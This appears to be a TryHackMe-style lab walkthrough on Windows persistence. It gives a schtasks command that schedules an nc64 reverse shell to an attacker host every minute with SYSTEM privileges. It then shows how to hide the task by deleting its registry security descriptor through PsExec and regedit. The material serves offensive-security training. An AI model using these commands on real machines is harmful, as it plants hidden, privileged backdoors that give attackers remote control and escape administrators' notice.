From the command line, you can use `schtasks` to interact with the task scheduler. A complete reference for the command can be found on [Microsoft's website](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks).

Let's create a task that runs a reverse shell every single minute. In a real-world scenario, you wouldn't want your payload to run so often.
```shell-session
C:\> schtasks /create /sc minute /mo 1 /tn {THM-TaskBackdoor} /tr "c:\tools\nc64 -e cmd.exe {ATTACKER_IP} {4449}" /ru SYSTEM
SUCCESS: The scheduled task "THM-TaskBackdoor" has successfully been created.
```

This command will create a "THM-TaskBackdoor" task and execute an `nc64` reverse shell back to the attacker. The `/sc` and `/mo` options indicate that the task should be run every single minute. The `/ru` option indicates that the task will run with SYSTEM privileges.
```shell-session
C:\> schtasks /query /tn thm-taskbackdoor

Folder: \
TaskName                                 Next Run Time          Status
======================================== ====================== ===============
thm-taskbackdoor                         5/25/2022 8:08:00 AM   Ready
```

**Making Our Task Invisible:**
 To further hide our scheduled task, we can make it invisible to any user in the system by deleting its **Security Descriptor (SD)**. The security descriptor is simply an *ACL* that states which users have access to the scheduled task. Deleting the *SD* is equivalent to disallowing all users' access to the scheduled task, including administrators.

The security descriptors of all scheduled tasks are stored in: `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\`. 
You will find a registry key for every task, under which a value named "*SD*" contains the security descriptor. You can only erase the value if you hold SYSTEM privileges.

To hide our task, delete the *SD* value for the "THM-TaskBackdoor" task we created before. To do so, we will use `psexec` (available in `C:\tools`) to open Regedit with SYSTEM privileges:
```shell-session
C:\> c:\tools\pstools\PsExec64.exe -s -i regedit
```

We will then delete the security descriptor for our task:
	![[Pasted image 20240911024459.png]]

If we try to query our service again, the system will tell us there is no such task:
```
C:\> schtasks /query /tn thm-taskbackdoor ERROR: The system cannot find the file specified.
```
